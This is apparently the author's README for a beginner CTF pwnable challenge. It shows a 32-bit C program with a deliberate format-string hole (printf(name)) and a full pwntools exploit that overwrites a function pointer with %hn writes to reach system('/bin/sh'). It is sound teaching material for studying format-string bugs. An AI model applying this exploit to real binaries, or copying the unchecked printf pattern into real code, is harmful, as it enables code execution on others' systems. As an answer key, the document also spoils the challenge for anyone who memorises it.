# 박물관 잠입작전

제30회 해킹캠프 CTF 출제 문제

**카테고리:** pwnable  
**기법:** Format String Bug (FSB), 함수 포인터 덮어쓰기  
**역할:** 문제 출제자 (문제 설계 / 환경 구성 / 풀이 작성)  
**컴파일:** `gcc -m32 -o chall chall.c -z lazy -no-pie`

---

## 문제 설명

> 평소 박물관 마니아로 잘 알려진 김철수 씨.  
> 모종의 사건으로 "박물관 광인"이라는 오명을 얻으며 모든 박물관의 블랙리스트에 오른다.  
> 하지만 그의 박물관 사랑을 멈출 수는 없는 법.  
> 입장 카드를 다시 받고야 말리라.

---

## 출제 의도

FSB(Format String Bug) 취약점을 통해서 익스플로잇이 가능하도록 설계

- `printf(buf)` 형태의 포맷 스트링 취약점 인식
- `%n` / `%hn`을 이용한 임의 주소 쓰기
- 함수 포인터(`block_ptr`)를 덮어 실행 흐름 제어

난이도는 FSB 개념을 처음 배우는 입문자 수준으로 설정했으며, 바이너리 내에 `my_code` 함수(`system("/bin/sh")`)가 존재하므로 별도의 셸코드나 ROP 없이 함수 포인터 덮어쓰기만으로 풀 수 있도록 의도했다.

---

## 보호 기법

| 보호 기법 | 적용 여부 | 비고 |
|-----------|-----------|------|
| PIE | ❌ | `-no-pie` 옵션으로 비활성화, 주소 고정 |
| RELRO | Partial | GOT 덮어쓰기 가능 (단, 본 문제는 함수 포인터 사용) |
| Canary | ❌ | 미적용 |
| NX | ✅ | 스택 실행 불가 |

---

## 취약점 분석

### 취약 지점

`enter_name` 함수에서 사용자 입력을 포맷 스트링 검증 없이 직접 `printf`에 전달한다.

```c
int enter_name() {
    printf("Please enter your name: ");
    char name[0x80] = {};
    read(0, name, 0x80 - 1);
    printf("So your name is ");
    printf(name);   // FSB 취약점: 포맷 스트링 검증 없음
    block_ptr();    // 함수 포인터 호출
    return 0;
}
```

### 실행 흐름 제어 대상

전역 함수 포인터 `block_ptr`은 초기에 `block` 함수를 가리킨다.

```c
void block() { puts("You are on the blacklist.\n"); }
void(*block_ptr)() = block;  // 전역 함수 포인터
```

목표 함수 `my_code`는 `system("/bin/sh")`를 실행한다.

```c
void my_code() { system("/bin/sh"); }
```

FSB로 `block_ptr`을 `my_code` 주소로 덮으면, `printf(name)` 직후 `block_ptr()` 호출 시 셸이 실행된다.

### 오프셋 확인

포맷 스트링에서 입력 버퍼는 **7번째** 인자에 위치한다.

```
AAAA %7$p  →  출력: So your name is AAAA 0x41414141
```

---

## 익스플로잇 전략

`block_ptr`은 4바이트 주소(32비트 바이너리)이므로 상위 2바이트(`+2`)와 하위 2바이트로 나눠 `%hn`으로 두 번 덮어쓴다.  
`low`와 `high` 중 작은 값을 먼저 써야 `%c` 카운터가 음수가 되지 않으므로 대소 비교 후 순서를 결정한다.

---

## 익스플로잇 코드

```python
from pwn import *

elf = ELF("./chall")
p = remote("localhost", 1337)        

block_ptr = elf.symbols["block_ptr"]  # 덮어쓸 함수 포인터 주소
get_shell = elf.symbols["my_code"]    # 목표: system("/bin/sh")

low  = get_shell & 0xffff             # 하위 2바이트
high = (get_shell >> 16) & 0xffff     # 상위 2바이트

# 작은 값을 먼저 써야 %c 카운터가 양수를 유지함
if low < high:
    payload  = p32(block_ptr) + p32(block_ptr + 2)
    payload += f"%{low - 8}c%7$hn".encode()
    payload += f"%{high - low}c%8$hn".encode()
else:
    payload  = p32(block_ptr + 2) + p32(block_ptr)
    payload += f"%{high - 8}c%7$hn".encode()
    payload += f"%{low - high}c%8$hn".encode()

p.sendafter(b"> ", b"2")
p.sendline(payload)
p.interactive()
```

---

## 실행 환경

```bash
# 도커로 환경 구성
$ sudo docker compose up -d

# 접속 테스트
$ nc localhost 1337
```

---

## 파일 구조

```
├── README.md
├── prob/
│   ├── chall.c        # 출제 소스코드
│   └── chall          # 바이너리
└── solve/
    └── exploit.py     # 출제자 풀이
```
